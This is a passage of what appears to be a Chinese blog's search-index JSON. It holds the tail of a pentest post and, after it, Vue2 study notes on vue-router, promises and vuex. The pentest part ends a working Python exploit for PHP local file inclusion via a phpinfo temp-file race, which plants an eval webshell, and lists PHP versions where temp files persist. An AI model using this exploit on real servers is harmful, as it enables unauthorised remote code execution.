phpinfo.send(self.req_payload)</span><br><span class=\"line\"></span><br><span class=\"line\">        infopage = <span class=\"string\">b&quot;&quot;</span> </span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(infopage) &lt; self.offset:</span><br><span class=\"line\">            infopage += phpinfo.recv(self.offset)</span><br><span class=\"line\"></span><br><span class=\"line\">        pos = infopage.decode(<span class=\"string\">&#x27;utf8&#x27;</span>).index(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">        tmpname = infopage[pos+<span class=\"number\">17</span>:pos+<span class=\"number\">31</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">        lfireq = self.lfireq % (tmpname.decode(<span class=\"string\">&#x27;utf8&#x27;</span>),self.host)</span><br><span class=\"line\">        lfi.send(lfireq.encode(<span class=\"string\">&#x27;utf8&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">        fipage = lfi.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        phpinfo.close()</span><br><span class=\"line\">        lfi.close()</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> fipage.decode(<span class=\"string\">&#x27;utf8&#x27;</span>).find(tag) != <span class=\"number\">-1</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> tmpname</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv) &lt; <span class=\"number\">4</span>:</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;usage:\\n\\texp.py 127.0.0.1 80 500&#x27;</span>)</span><br><span class=\"line\">        exit()</span><br><span class=\"line\">    host = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">    port = sys.argv[<span class=\"number\">2</span>]</span><br><span class=\"line\">    attempts = sys.argv[<span class=\"number\">3</span>]</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;&#123;x&#125;Start expolit &#123;host&#125;:&#123;port&#125; &#123;attempts&#125; times&#123;x&#125;&#x27;</span>.<span class=\"built_in\">format</span>(x=<span class=\"string\">&#x27;*&#x27;</span>*<span class=\"number\">15</span>, host=host, port=port, attempts=attempts))</span><br><span class=\"line\"></span><br><span class=\"line\">    p = PHPINFO_LFI(host,port)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">int</span>(attempts)):</span><br><span class=\"line\">        print(<span class=\"string\">&#x27;Trying &#123;&#125;/&#123;&#125; times…&#x27;</span>.<span class=\"built_in\">format</span>(i, attempts), end=<span class=\"string\">&quot;\\r&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> p.phpinfo_lfi() <span class=\"keyword\">is</span> <span class=\"keyword\">not</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">            print(<span class=\"string\">&#x27;Getshell success! at /tmp/eval &quot;&lt;?=eval($_REQUEST[1])?&gt;&quot;&#x27;</span>)</span><br><span class=\"line\">            exit()</span><br><span class=\"line\">    print(<span class=\"string\">&#x27;:( Failed&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n\n\n<p><strong>但在实际使用过程中，tmp文件删除太快，导致基本没有成功包含过。</strong>由此引发的后续研究。</p>\n<h1 id=\"0x02-php临时文件\"><a href=\"#0x02-php临时文件\" class=\"headerlink\" title=\"0x02 php临时文件\"></a>0x02 php临时文件</h1><p><strong>配置文件</strong>：<code>php.ini</code>的<code>upload_tmp_dir</code>属性指定</p>\n<p><strong>命名规则</strong>：默认为 php+4或者6位随机数字和大小写字母，php[0-9A-Za-z]{3,4,5,6}，phpXXXXXX.tmp 在windows下有tmp后缀，linux没有。</p>\n<p>让临时文件保存下来：</p>\n<p>php7在满足以下版本的情况下，可以通过<code>php://filter/string.strip_tags</code>生成<code>tmp</code>文件</p>\n<p>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复</p>\n<p>• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复</p>\n<p>• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复</p>\n<h1 id=\"参考文档\"><a href=\"#参考文档\" class=\"headerlink\" title=\"参考文档\"></a>参考文档</h1><ol>\n<li><p><a href=\"https://www.anquanke.com/post/id/183046\">PHP临时文件机制与利用的思考</a></p>\n</li>\n<li><p><a href=\"https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md\">PHP文件包含漏洞（利用phpinfo）</a></p>\n</li>\n<li><p><a href=\"https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py\">https://github.com/M4LV0/LFI-phpinfo-RCE/blob/master/exploit.py</a></p>\n</li>\n</ol>\n","categories":["Pentest"],"tags":["php"]},{"title":"vue2学习笔记3","url":"http://blog.le31ei.top/2021/01/28/vue2学习笔记3/","content":"<h1 id=\"1-vue-router\"><a href=\"#1-vue-router\" class=\"headerlink\" title=\"1. vue-router\"></a>1. vue-router</h1><ol>\n<li>创建路由组件</li>\n<li>配置路由映射: 组件和路径映射关系</li>\n<li>使用路由: 通过<code>&lt;router-link&gt;</code>和<code>&lt;router-view&gt;</code></li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Vue <span class=\"keyword\">from</span> <span class=\"string\">&#x27;vue&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> VueRouter <span class=\"keyword\">from</span> <span class=\"string\">&#x27;vue-router&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> Home <span class=\"keyword\">from</span> <span class=\"string\">&quot;@/components/Home&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">import</span> About <span class=\"keyword\">from</span> <span class=\"string\">&quot;@/components/About&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Vue.use(VueRouter)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> routes = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    path: <span class=\"string\">&#x27;&#x27;</span>,</span><br><span class=\"line\">    redirect: <span class=\"string\">&#x27;/home&#x27;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    path: <span class=\"string\">&#x27;/home&#x27;</span>,</span><br><span class=\"line\">    component: Home</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    path: <span class=\"string\">&#x27;/about&#x27;</span>,</span><br><span class=\"line\">    component: About</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> router = <span class=\"keyword\">new</span> VueRouter(&#123;</span><br><span class=\"line\">  routes,</span><br><span class=\"line\">  mode: <span class=\"string\">&#x27;history&#x27;</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> router</span><br></pre></td></tr></table></figure>\n\n<p><strong>路由模式更换</strong></p>\n<p>默认格式：<code>http://localhost:8080/#/home</code></p>\n<p>history模式: <code>http://localhost:8080/home</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> router = <span class=\"keyword\">new</span> VueRouter(&#123;</span><br><span class=\"line\">  routes,</span><br><span class=\"line\">  mode: <span class=\"string\">&#x27;history&#x27;</span></span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p><strong>router-link属性</strong></p>\n<ol>\n<li>tag属性：可以指定<code>&lt;router-link&gt;</code>渲染成什么组件，比如<code>&lt;li&gt;</code></li>\n<li>to属性：跳转到某个url</li>\n<li>replace属性：替换模式，不能使用浏览器前进后退按钮</li>\n<li>Active-class属性：选中的router-link有<code>router-link-active</code>的class属性，将<code>router-link-active</code>更名</li>\n</ol>\n<p><strong>代码跳转路由</strong></p>\n<p><code>this.$router.push(&#39;/home&#39;)</code></p>\n<p><code>this.$router.replace(&#39;/home&#39;)</code></p>\n<p><strong>动态路由</strong></p>\n<p>获取路由参数：<code>this.$route.params.id</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> routes = [</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    path: <span class=\"string\">&#x27;/user/:id&#x27;</span>,</span><br><span class=\"line\">    component: User</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<p><strong>懒加载</strong></p>\n<p>当用户访问到路由的时候才加载响应的组件，更加高效</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  path: <span class=\"string\">&#x27;/home&#x27;</span>,</span><br><span class=\"line\">  component: <span class=\"function\">() =&gt;</span> <span class=\"keyword\">import</span>(<span class=\"string\">&#x27;../components/Home&#x27;</span>)</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n\n<p><strong>路由嵌套</strong></p>\n<ol>\n<li>创建对应子组件，并在路由上配置对应的子路由</li>\n<li>在组件内部使用<code>&lt;router-view&gt;</code>标签</li>\n</ol>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  path: <span class=\"string\">&#x27;/home&#x27;</span>,</span><br><span class=\"line\">  component: <span class=\"function\">() =&gt;</span> <span class=\"keyword\">import</span>(<span class=\"string\">&#x27;../components/Home&#x27;</span>),</span><br><span class=\"line\">  children: [</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">&#x27;news&#x27;</span>,</span><br><span class=\"line\">      component: HomeNews</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      path: <span class=\"string\">&#x27;message&#x27;</span>,</span><br><span class=\"line\">      component: HomeMessage</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  ]</span><br><span class=\"line\">&#125;,</span><br><span class=\"line\">  <span class=\"comment\">// 在父组件中要加上&lt;router-view&gt;</span></span><br><span class=\"line\">   &lt;router-link to=<span class=\"string\">&quot;/home/news&quot;</span>&gt;新闻&lt;/router-link&gt;</span><br><span class=\"line\">&lt;router-link to=<span class=\"string\">&quot;/home/message&quot;</span>&gt;消息&lt;/router-link&gt;</span><br><span class=\"line\">&lt;router-view&gt;&lt;/router-view&gt;</span><br></pre></td></tr></table></figure>\n\n<p><strong>参数传递</strong></p>\n<p>query方式:profile?id=1：</p>\n<p><code>&lt;router-link :to=&quot;&#123;path: &#39;/profile&#39;, query: &#123;id: &#39;1&#39;&#125;&#125;&quot;&gt;Profile&lt;/router-link&gt;</code></p>\n<p>js方式：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">this</span>.$router.push(&#123;</span><br><span class=\"line\">  path: <span class=\"string\">&#x27;profile&#x27;</span>,</span><br><span class=\"line\">  query: &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<p>取值方式：<code>this.$router.query.id</code></p>\n<p>路径方式：</p>\n<p><code>&lt;router-link :to=&quot;/user/+userid&quot;&gt;用户&lt;/router-link&gt;</code></p>\n<p>js方式：</p>\n<p><code>this.$router.push(&#39;/profile&#39;+ this.userid)</code></p>\n<p><strong>导航守卫</strong></p>\n<p>title更换为对应页面的title</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// routes</span></span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        path: <span class=\"string\">&#x27;message&#x27;</span>,</span><br><span class=\"line\">        component: HomeMessage,</span><br><span class=\"line\">        meta:&#123;</span><br><span class=\"line\">          title: <span class=\"string\">&#x27;message&#x27;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\">        </span><br><span class=\"line\">        </span><br><span class=\"line\">router.beforeEach(<span class=\"function\">(<span class=\"params\">to, <span class=\"keyword\">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"built_in\">document</span>.title = to.meta.title</span><br><span class=\"line\">  next()</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"2-promise\"><a href=\"#2-promise\" class=\"headerlink\" title=\"2. promise\"></a>2. promise</h1><p>异步编程解决方案</p>\n<p>promise本身是一个类，传入的箭头函数参数resolve和reject也是两个函数，成功的时候调用resolve，失败的时候调用reject，</p>\n<p>成功的处理代码写在then中，失败的代码写在catch中</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;请求&#x27;</span>)</span><br><span class=\"line\">        <span class=\"comment\">//resolve()    //调用resolve直接跳到.then()</span></span><br><span class=\"line\">        reject()     <span class=\"comment\">//调用reject，直接调到catch()</span></span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">&#125;).then(<span class=\"function\">() =&gt;</span> &#123;    <span class=\"comment\">// then可以直接传入两个函数，而省略掉catch</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;success&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;).catch(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;failed&#x27;</span>)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p><strong>三种状态</strong></p>\n<p>pending：等待状态，比如正在进行网络请求，或者定时器没有到指定时间</p>\n<p>Fulfill: 满足状态，比如主动调用了resolve，就处于该状态，并且回调.then()</p>\n<p>reject: 拒绝状态，当我们主动回调了reject时，就处于该状态，并且回调.catch()</p>\n<p><strong>链式调用</strong></p>\n<p>promise可以直接省略</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">()=&gt;</span> &#123;</span><br><span class=\"line\">        resolve(<span class=\"string\">&#x27;aaa&#x27;</span>)</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">&#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(res)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">Promise</span>.resolve(res+ <span class=\"string\">&#x27;222&#x27;</span>)</span><br><span class=\"line\">&#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(res)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> res+<span class=\"string\">&#x27;3333&#x27;</span>  <span class=\"comment\">// 省略promise的resolve，直接调用then对结果进行处理</span></span><br><span class=\"line\">&#125;).then(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(res)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<p><strong>等待同步请求: promise.all</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Promise</span>.all([</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">            resolve(<span class=\"string\">&#x27;请求1&#x27;</span>)</span><br><span class=\"line\">        &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">    &#125;),</span><br><span class=\"line\">    <span class=\"keyword\">new</span> <span class=\"built_in\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">//resolve(&#x27;请求2&#x27;)</span></span><br><span class=\"line\">            reject(<span class=\"string\">&#x27;请求2失败&#x27;</span>)</span><br><span class=\"line\">        &#125;, <span class=\"number\">2000</span>)</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">]).then(<span class=\"function\"><span class=\"params\">results</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(results[<span class=\"number\">0</span>])</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(results[<span class=\"number\">1</span>])</span><br><span class=\"line\">&#125;).catch(<span class=\"function\"><span class=\"params\">err</span> =&gt;</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(err)</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"3-vuex\"><a href=\"#3-vuex\" class=\"headerlink\" title=\"3. vuex\"></a>3. vuex</h1><p>状态管理模式</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> Vue <span class=\"keyword\">from</span> <span class=\"string\">&#x27;vue&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> Vuex <span class=\"keyword\">from</span> <span class=\"string\">&#x27;vuex&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">Vue.use(Vuex)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> store = <span class=\"keyword\">new</span> Vuex.Store(&#123;</span><br><span class=\"line\">  state: &#123;  <span class=\"comment\">// 定义要存放的数据</span></span><br><span class=\"line\">    counter: <span class=\"number\">1000</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  mutations: &#123;  <span class=\"comment\">// 定义要怎么修改state的方法</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">increament</span>(<span class=\"params\">state</span>)</span>&#123;</span><br><span class=\"line\">      state.counter ++</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    <span class=\"function\"><span class=\"title\">decreament</span>(<span class=\"params\">state</span>)</span>&#123;</span><br><span class=\"line\">      state.counter --</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  actions: &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  getters: &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  modules: &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> store</span><br></pre></td></tr></table></figure>\n\n<p>调用的时候需要通过commit进行调用</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">this</span>.$store.commit(<span class=\"string\">&#x27;increament&#x27;</span>, )</span><br><span class=\"line\"><span class=\"comment\">// commit传值</span></span><br><span class=\"line\"><span class=\"built_in\">this</span>.$store.commit(<span class=\"string\">&#x27;increament&#x27;</span>, <span class=\"number\">5</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>state</strong></p>\n<p>单一状态树，全部状体放在一个store里面</p>\n<p><strong>getters</strong></p>\n<p>对state的数据进行变形后输出，类似于计算属性</p>\n<p>调用方法：</p>\n<p><code>$store.getters.doubleCounter</code></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">getters: &#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">doubleCounter</span>(<span class=\"params\">state, getters</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> state.counter * state.counter</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n\n<p><strong>响应式操作state</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Vue.set(state.info, <span class=\"string\">&#x27;age&#x27;</span>, <span class=\"number\">40</span>)</span><br><span class=\"line\">Vue.delete(state.info, <span class=\"string\">&#x27;age&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<p><strong>mutations</strong></p>\n<p>只能存放同步操作，不能使用异步操作，存在异步操作使用actions</p>\n<p><strong>actions</strong></p>\n<p>存放异步操作，但是只能调用mutations里面的同步函数，对state进行操作</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">actions: &#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">aUpdateInfo</span>(<span class=\"params\">context</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> &#123;</span><br><span class=\"line\">      context.commit(<span class=\"string\">&#x27;updateInfo&#x27;</span>)</span><br><span class=\"line\">    &#125;, <span class=\"number\">1000</span>)</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;,</span><br></pre></td></tr></table></figure>\n\n<p>调用方法：<code>this.$store.dispatch(&#39;aUpdateInfo&#39;)</code></p>\n<p><strong>modules</strong></p>\n<p>对state中的数据进行分模块</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">modules: &#123;</span><br><span class=\"line\">  a: &#123;</span><br><span class=\"line\">    actions: &#123;&#125;,</span><br><span class=\"line\">    mutations: &#123;&#125;,</span><br><span class=\"line\">    getters: &#123;&#125;,</span><br><span class=\"line\">    state: &#123;&#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n","categories":["Program"],"tags":["vue"]},{"title":"vue2学习笔记2","url":"http://blog.le31ei.top/2021/01/26/vue2学习笔记2/","content":"<h1 id=\"1-filter-map-reduce\"><a href=\"#1-filter-map-reduce\" class=\"headerlink\" title=\"1. filter/map/reduce\"></a>1. filter/map/reduce</h1><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> nums = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">4</span>, <span class=\"number\">10</span>, <span class=\"number\">15</span>, <span class=\"number\">20</span>, <span class=\"number\">200</span>, <span class=\"number\">40</span>, <span class=\"number\">300</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// filter：过滤函数</span></span><br><span class=\"line\"><span class=\"comment\">// filter回调函数必须返回一个boolean类型的值</span></span><br><span class=\"line\"><span class=\"comment\">// 返回true： 将回调的n参数加入到新的数组中</span></span><br><span class=\"line\"><span 